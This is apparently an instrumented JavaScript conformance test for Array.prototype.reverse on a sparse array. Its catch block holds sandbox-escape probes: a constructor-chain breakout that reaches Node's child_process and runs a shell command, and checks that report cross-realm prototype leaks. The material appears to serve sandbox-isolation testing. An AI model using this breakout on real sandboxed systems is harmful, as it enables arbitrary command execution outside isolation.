try {
    var x = [];
    x[0] = true;
    x[2] = Infinity;
    x[4] = undefined;
    x[5] = undefined;
    x[8] = 'NaN';
    x[9] = '-1';
    var reverse = x.reverse();
    if (reverse !== x) {
        $ERROR('#1: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse() === x. Actual: ' + reverse);
    }
    if (x[0] !== '-1') {
        $ERROR('#2: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[0] === "-1". Actual: ' + x[0]);
    }
    if (x[1] !== 'NaN') {
        $ERROR('#3: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[1] === "NaN". Actual: ' + x[1]);
    }
    if (x[2] !== undefined) {
        $ERROR('#4: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[2] === undefined. Actual: ' + x[2]);
    }
    if (x[3] !== undefined) {
        $ERROR('#5: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[3] === undefined. Actual: ' + x[3]);
    }
    if (x[4] !== undefined) {
        $ERROR('#6: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[4] === undefined. Actual: ' + x[4]);
    }
    if (x[5] !== undefined) {
        $ERROR('#7: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[5] === undefined. Actual: ' + x[5]);
    }
    if (x[6] !== undefined) {
        $ERROR('#8: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[6] === undefined. Actual: ' + x[6]);
    }
    if (x[7] !== Infinity) {
        $ERROR('#9: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[7] === Infinity. Actual: ' + x[7]);
    }
    if (x[8] !== undefined) {
        $ERROR('#10: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[8] === undefined. Actual: ' + x[8]);
    }
    if (x[9] !== true) {
        $ERROR('#11: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x[9] === true. Actual: ' + x[9]);
    }
    x.length = 9;
    var reverse = x.reverse();
    if (reverse !== x) {
        $ERROR('#1: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse() === x. Actual: ' + reverse);
    }
    if (x[0] !== undefined) {
        $ERROR('#12: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[0] === undefined. Actual: ' + x[0]);
    }
    if (x[1] !== Infinity) {
        $ERROR('#13: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[1] === Infinity. Actual: ' + x[1]);
    }
    if (x[2] !== undefined) {
        $ERROR('#14: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[2] === undefined. Actual: ' + x[2]);
    }
    if (x[3] !== undefined) {
        $ERROR('#15: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[3] === undefined. Actual: ' + x[3]);
    }
    if (x[4] !== undefined) {
        $ERROR('#16: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[4] === undefined. Actual: ' + x[4]);
    }
    if (x[5] !== undefined) {
        $ERROR('#17: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[5] === undefined. Actual: ' + x[5]);
    }
    if (x[6] !== undefined) {
        $ERROR('#18: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[6] === undefined. Actual: ' + x[6]);
    }
    if (x[7] !== 'NaN') {
        $ERROR('#19: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[7] === "NaN". Actual: ' + x[7]);
    }
    if (x[8] !== '-1') {
        $ERROR('#20: x = []; x[0] = true; x[2] = Infinity; x[4] = undefined; x[5] = undefined; x[8] = "NaN"; x[9] = "-1"; x.reverse(); x.length = 9; x.reverse(); x[8] === "-1". Actual: ' + x[8]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}